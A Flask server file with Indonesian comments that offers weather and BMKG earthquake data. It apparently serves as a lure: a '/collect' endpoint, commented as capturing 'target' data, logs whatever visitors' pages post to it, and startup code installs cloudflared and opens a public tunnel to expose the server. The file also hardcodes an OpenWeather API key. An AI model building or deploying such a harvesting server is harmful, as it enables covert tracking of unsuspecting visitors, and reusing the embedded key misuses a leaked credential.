from flask import Flask, render_template, request, jsonify
import os
import requests

app = Flask(__name__)

OPENWEATHER_API_KEY = "a286a42195f1251e1335f5de18178afd"
BMKG_GEMPA_URL = "https://data.bmkg.go.id/DataMKG/TEWS/gempaterkini.json"

# Route utama untuk menampilkan halaman
@app.route('/')
def home():
    return render_template('index.html')

# Endpoint untuk menangkap data target
@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    print(f"Data target diterima: {data}")
    return jsonify({"status": "success"})

# Endpoint untuk mendapatkan cuaca berdasarkan koordinat
@app.route('/weather', methods=['POST'])
def weather():
    data = request.json
    lat = data.get("lat")
    lon = data.get("lon")
    
    if not lat or not lon:
        return jsonify({"error": "Latitude dan Longitude diperlukan"}), 400
    
    weather_url = f"https://api.openweathermap.org/data/2.5/weather?lat={lat}&lon={lon}&appid={OPENWEATHER_API_KEY}&units=metric"
    response = requests.get(weather_url)
    return jsonify(response.json())

# Endpoint untuk mendapatkan info gempa terkini dari BMKG
@app.route('/earthquake', methods=['GET'])
def earthquake():
    response = requests.get(BMKG_GEMPA_URL)
    gempa_data = response.json()
    
    if "Infogempa" in gempa_data and "gempa" in gempa_data["Infogempa"]:
        latest_quake = gempa_data["Infogempa"]["gempa"][0]
        quake_info = {
            "tanggal": latest_quake["Tanggal"],
            "jam": latest_quake["Jam"],
            "magnitude": latest_quake["Magnitude"],
            "kedalaman": latest_quake["Kedalaman"],
            "lokasi": latest_quake["Wilayah"],
            "koordinat": latest_quake["Coordinates"]
        }
        return jsonify(quake_info)
    else:
        return jsonify({"error": "Data gempa tidak tersedia"})

# Endpoint untuk mendapatkan cuaca di kota besar di Indonesia
@app.route('/city_weather', methods=['GET'])
def city_weather():
    cities = {
        "Jakarta": "-6.2088,106.8456",
        "Bandung": "-6.9175,107.6191",
        "Surabaya": "-7.2504,112.7688",
        "Medan": "3.5952,98.6722"
    }
    city_weather_data = {}
    
    for city, coords in cities.items():
        lat, lon = coords.split(',')
        weather_url = f"https://api.openweathermap.org/data/2.5/weather?lat={lat}&lon={lon}&appid={OPENWEATHER_API_KEY}&units=metric"
        response = requests.get(weather_url).json()
        city_weather_data[city] = {
            "temp": response["main"]["temp"],
            "weather": response["weather"][0]["description"]
        }
    
    return jsonify(city_weather_data)

if __name__ == '__main__':
    port = 8888
    print(f"Server berjalan di http://127.0.0.1:{port}")
    os.system("pkg install cloudflared -y")
    os.system("cloudflared tunnel run &")
    app.run(host='0.0.0.0', port=port)
